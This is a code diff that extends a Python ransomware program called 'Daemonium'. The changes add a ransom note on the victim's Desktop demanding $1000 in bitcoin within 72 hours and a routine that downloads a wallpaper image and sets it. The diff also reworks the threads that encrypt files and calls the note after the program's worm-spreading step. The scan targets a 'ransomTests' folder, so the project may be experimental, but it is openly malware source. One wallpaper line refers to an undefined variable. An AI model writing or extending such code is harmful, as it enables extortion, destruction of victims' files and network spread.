@@ -2,8 +2,10 @@ import os
 import platform
 import socket
 import sqlite3
+import subprocess
 import threading
 import time
+import urllib.error
 from datetime import datetime, timedelta
 from pathlib import Path
 from typing import List, Any, Dict
@@ -12,6 +14,7 @@ import netifaces
 import nmap
 import paramiko
 import psutil
+import requests
 from Crypto import Cipher
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
@@ -42,10 +45,46 @@ class Daemonium:
         self.__content: List[Any] = []
         self.__data: Dict[str, Any] = {}
 
+    def __write_readme(self) -> None:
+        with open(os.path.join(os.path.expanduser('~'), r'Desktop/README.txt'), 'w', encoding='latin1') as file:
+            file.write("""Many of your important files have been encrypted by RANSOMWARE DAEMONIUM so that recovery is 
+            impossible without the key. But don't worry, if after 72h you make the payment of $1000 to the 
+            XXXXXX bitcoin card, we will send you the key to get you back your normal life without worries.""")
+        self._change_wallpaper()
+
     def __get_public_key(self) -> RsaKey:
         with open(self.__public_key_path, 'rb') as f:
             self.__public_key = RSA.import_key(f.read())
         return self.__public_key
+
+    @staticmethod
+    def _change_wallpaper() -> None:
+        try:
+
+            url = "https://pixabay.com/get/g17741f6fb5fb3daa1813632c227adf15e9a705f5602414833741446596a86b4ec01f3efc244f21b9c603b3bbeddf978b42e0e4a8d778e65927c563fd47afea6629bc9c3e040b00328981dacd6262298f_1920.jpg"
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
+            }
+
+            response = requests.get(url, headers=headers)
+            if response.status_code == 200:
+                with open("daemonium.jpg", "wb") as f:
+                    f.write(response.content)
+            else:
+                ...
+        except urllib.error.HTTPError:
+            ...
+        else:
+            time.sleep(5)
+            try:
+                subprocess.Popen([
+                    "gsettings", "set", "org.gnome.desktop.background", "picture-uri",
+                    "file://" + os.getcwd() + "/daemonium.jpg"
+                ])
+                os.system(f" gsettings set org.gnome.desktop.background picture-uri file://{new_wallpaper_path}")
+
+            except Exception as e:
+                print(e)
 
     def __get_cipher(self) -> Cipher:
         return PKCS1_OAEP.new(self.__get_public_key())
@@ -55,10 +94,13 @@ class Daemonium:
 
     def __find_files(self) -> None:
         home: str = os.path.join(os.path.expanduser('~'), r'Documents/ransomTests')
+        threads = []
         for root, dirs, files in os.walk(home):
             for names in files:
                 if Path(os.path.join(root, names)).suffix in self.__files:
-                    threading.Thread(target=self.__encrypt, args=(os.path.join(root, names), )).start()
+                    threads.append(threading.Thread(target=self.__encrypt, args=(os.path.join(root, names), )))
+        [thread.start() for thread in threads]
+        [thread.join() for thread in threads]
 
     def __encrypt(self, file: str) -> None:
         encrypted_data = bytearray()
@@ -175,6 +217,7 @@ class Daemonium:
         self.__find_files()
         print(f"Trying to spread myself...")
         self.__worm_function()
+        self.__write_readme()
 
 
 if __name__ == '__main__':
